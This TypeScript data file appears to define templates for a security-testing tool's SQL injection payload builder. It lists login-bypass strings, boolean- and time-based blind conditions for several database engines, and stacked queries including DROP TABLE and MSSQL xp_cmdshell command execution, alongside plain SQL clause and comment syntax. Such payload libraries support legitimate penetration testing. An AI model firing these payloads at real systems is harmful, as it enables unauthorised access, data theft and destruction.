import { TemplateCategory } from '../../types/template';

export const sqlBasicCategory: TemplateCategory = {
  id: 'sql-basic',
  label: 'SQL Basic',
  description: 'Standard SQL syntax templates, clause builders, auth bypass, boolean & time-based blind queries',
  iconName: 'Database',
  subcategories: [
    {
      id: 'auth-bypass',
      label: 'Authentication Bypass',
      description: 'Common SQL injection patterns for bypassing login forms and authentication barriers',
      templates: [
        {
          id: 'sql-auth-admin-dash',
          name: "Admin Login Bypass (admin' --)",
          description: 'Comments out password verification for admin user with double dash',
          content: "admin' --"
        },
        {
          id: 'sql-auth-admin-hash',
          name: "Admin Login Bypass (admin' #)",
          description: 'Comments out password verification with MySQL hash comment',
          content: "admin' #"
        },
        {
          id: 'sql-auth-or-1-1',
          name: "Classic OR 1=1 (' OR 1=1 --)",
          description: 'Always-true boolean condition with comment delimiter',
          content: "' OR 1=1 --"
        },
        {
          id: 'sql-auth-or-1-1-hash',
          name: "Classic OR 1=1 with Hash (' OR 1=1 #)",
          description: 'Always-true boolean condition with hash comment',
          content: "' OR 1=1 #"
        },
        {
          id: 'sql-auth-or-empty',
          name: "Quote-Balanced OR (' OR ''=')",
          description: 'Balances quotes without needing comment characters',
          content: "' OR ''='"
        },
        {
          id: 'sql-auth-dquote-empty',
          name: 'Double Quote-Balanced OR (" OR ""=")',
          description: 'Balances double-quoted input without comments',
          content: '" OR ""="'
        },
        {
          id: 'sql-auth-or-char',
          name: "String Equality OR (' OR 'x'='x')",
          description: 'Always-true string comparison without comments',
          content: "' OR 'x'='x'"
        },
        {
          id: 'sql-auth-admin-paren',
          name: "Parenthesis Closed Admin (admin') --)",
          description: 'Closes parenthesized WHERE clauses and comments remainder',
          content: "admin') --"
        },
        {
          id: 'sql-auth-limit-1',
          name: "OR 1=1 with LIMIT 1 (' OR 1=1 LIMIT 1 --)",
          description: 'Ensures only the first database record (typically admin) is selected',
          content: "' OR 1=1 LIMIT 1 --"
        }
      ]
    },
    {
      id: 'boolean-blind',
      label: 'Boolean-Based Blind',
      description: 'Condition templates for inferring database states via true/false response variations',
      templates: [
        {
          id: 'sql-bool-and-true',
          name: 'AND True Condition (AND 1=1)',
          description: 'Baseline positive numeric assertion',
          content: 'AND 1=1'
        },
        {
          id: 'sql-bool-and-false',
          name: 'AND False Condition (AND 1=2)',
          description: 'Baseline negative numeric assertion',
          content: 'AND 1=2'
        },
        {
          id: 'sql-bool-or-true',
          name: 'OR True Condition (OR 1=1)',
          description: 'Always-true condition to force content reflection',
          content: 'OR 1=1'
        },
        {
          id: 'sql-bool-and-str-true',
          name: "AND True String (AND 'a'='a')",
          description: 'Positive string literal equality assertion',
          content: "AND 'a'='a'"
        },
        {
          id: 'sql-bool-and-str-false',
          name: "AND False String (AND 'a'='b')",
          description: 'Negative string literal assertion',
          content: "AND 'a'='b'"
        },
        {
          id: 'sql-bool-subquery',
          name: 'Subquery Boolean Assertion',
          description: 'Tests subquery evaluation within a condition',
          content: 'AND (SELECT 1)=1'
        },
        {
          id: 'sql-bool-length',
          name: 'Length Extraction Condition',
          description: 'Checks if the length of an expression exceeds a target threshold',
          content: 'AND LENGTH({expression}) > {num}'
        },
        {
          id: 'sql-bool-substr',
          name: 'Substring Character Condition',
          description: 'Extracts and compares a specific character position',
          content: "AND SUBSTRING({expression}, {position}, 1) = '{char}'"
        }
      ]
    },
    {
      id: 'time-blind',
      label: 'Time-Based Blind',
      description: 'Deliberate delay functions across various database engines to extract data via latency',
      templates: [
        {
          id: 'sql-time-mysql-sleep',
          name: 'MySQL SLEEP Injection',
          description: 'Triggers execution delay using MySQL SLEEP()',
          content: 'AND (SELECT SLEEP({seconds}))'
        },
        {
          id: 'sql-time-mysql-benchmark',
          name: 'MySQL BENCHMARK Delay',
          description: 'CPU-bound loop delay for MySQL when SLEEP is blocked',
          content: 'AND BENCHMARK(5000000, MD5(1))'
        },
        {
          id: 'sql-time-mssql-waitfor',
          name: 'MSSQL WAITFOR DELAY',
          description: 'Microsoft SQL Server time delay statement',
          content: "WAITFOR DELAY '0:0:{seconds}'"
        },
        {
          id: 'sql-time-postgre-sleep',
          name: 'PostgreSQL pg_sleep Injection',
          description: 'Triggers execution pause using PostgreSQL pg_sleep()',
          content: 'AND (SELECT pg_sleep({seconds}))'
        },
        {
          id: 'sql-time-oracle-pipe',
          name: 'Oracle DBMS_PIPE Delay',
          description: 'Oracle DBMS_PIPE.RECEIVE_MESSAGE time delay',
          content: "AND 1=dbms_pipe.receive_message('RDS', {seconds})"
        },
        {
          id: 'sql-time-sqlite-heavy',
          name: 'SQLite Heavy Query Delay',
          description: 'Causes SQLite execution delay using randomblob computation',
          content: "AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))"
        },
        {
          id: 'sql-time-cond-mysql',
          name: 'MySQL Conditional SLEEP',
          description: 'Executes delay only if the specified test condition evaluates to TRUE',
          content: 'AND IF({condition}, SLEEP({seconds}), 0)'
        },
        {
          id: 'sql-time-cond-postgre',
          name: 'PostgreSQL Conditional pg_sleep',
          description: 'Executes delay conditionally using CASE WHEN in PostgreSQL',
          content: 'AND (SELECT CASE WHEN ({condition}) THEN pg_sleep({seconds}) ELSE pg_sleep(0) END)'
        }
      ]
    },
    {
      id: 'stacked-queries',
      label: 'Stacked Queries',
      description: 'Multiple queries chained via semicolons (MSSQL, PostgreSQL, Multi-statement MySQL)',
      templates: [
        {
          id: 'sql-stacked-insert',
          name: 'Stacked INSERT Statement',
          description: 'Chained insert statement placeholder',
          content: '; INSERT INTO {table} ({columns}) VALUES ({values}) --'
        },
        {
          id: 'sql-stacked-update',
          name: 'Stacked UPDATE Statement',
          description: 'Chained update statement placeholder',
          content: "; UPDATE {table} SET {column} = '{value}' WHERE {condition} --"
        },
        {
          id: 'sql-stacked-delete',
          name: 'Stacked DELETE Statement',
          description: 'Chained delete statement placeholder',
          content: '; DELETE FROM {table} WHERE {condition} --'
        },
        {
          id: 'sql-stacked-mssql-xp',
          name: 'MSSQL xp_cmdshell Execution',
          description: 'Stacked command execution through MSSQL xp_cmdshell placeholder',
          content: "; EXEC master..xp_cmdshell '{command}' --"
        },
        {
          id: 'sql-stacked-drop',
          name: 'Stacked DROP Table Statement',
          description: 'Chained table removal placeholder',
          content: '; DROP TABLE {table} --'
        }
      ]
    },
    {
      id: 'clauses',
      label: 'SQL Query Clauses',
      description: 'Standard query construction clauses',
      templates: [
        {
          id: 'sql-select',
          name: 'SELECT Statement Template',
          description: 'Basic SELECT statement placeholder',
          content: 'SELECT {columns} FROM {table} WHERE {condition}'
        },
        {
          id: 'sql-order-by',
          name: 'ORDER BY Clause',
          description: 'Sorting clause template',
          content: 'ORDER BY {column_index_or_name} ASC'
        },
        {
          id: 'sql-group-by',
          name: 'GROUP BY Clause',
          description: 'Grouping clause template',
          content: 'GROUP BY {column_name} HAVING {condition}'
        },
        {
          id: 'sql-limit-offset',
          name: 'LIMIT & OFFSET Clause',
          description: 'Pagination and row limiting clause',
          content: 'LIMIT {limit} OFFSET {offset}'
        },
        {
          id: 'sql-having',
          name: 'HAVING Clause',
          description: 'Post-aggregation filtering clause',
          content: 'HAVING {condition}'
        },
        {
          id: 'sql-union-all',
          name: 'UNION ALL SELECT Clause',
          description: 'Chained result set union statement',
          content: 'UNION ALL SELECT {columns}'
        }
      ]
    },
    {
      id: 'comments',
      label: 'SQL Comments',
      description: 'Standard comment delimiters and comment wrappers',
      templates: [
        {
          id: 'sql-comment-inline',
          name: 'Standard Inline Comment (--)',
          description: 'Standard ANSI SQL double dash comment syntax',
          content: '-- {comment}'
        },
        {
          id: 'sql-comment-inline-dash',
          name: 'Inline Plus Comment (--+)',
          description: 'URL-friendly double dash plus space comment',
          content: '--+'
        },
        {
          id: 'sql-comment-hash',
          name: 'Hash Comment (#)',
          description: 'Single character hash comment delimiter',
          content: '# {comment}'
        },
        {
          id: 'sql-comment-block',
          name: 'Block Comment Syntax (/* */)',
          description: 'Multi-line block comment syntax',
          content: '/* {comment_block} */'
        },
        {
          id: 'sql-comment-version-mysql',
          name: 'MySQL Versioned Comment (/*!50000 ... */)',
          description: 'Conditional comment parsed only by MySQL engines >= version',
          content: '/*!50000 {sql_code} */'
        },
        {
          id: 'sql-comment-nullbyte',
          name: 'Null Byte (%00)',
          description: 'URL-encoded null byte termination character',
          content: '%00'
        }
      ]
    }
  ]
};
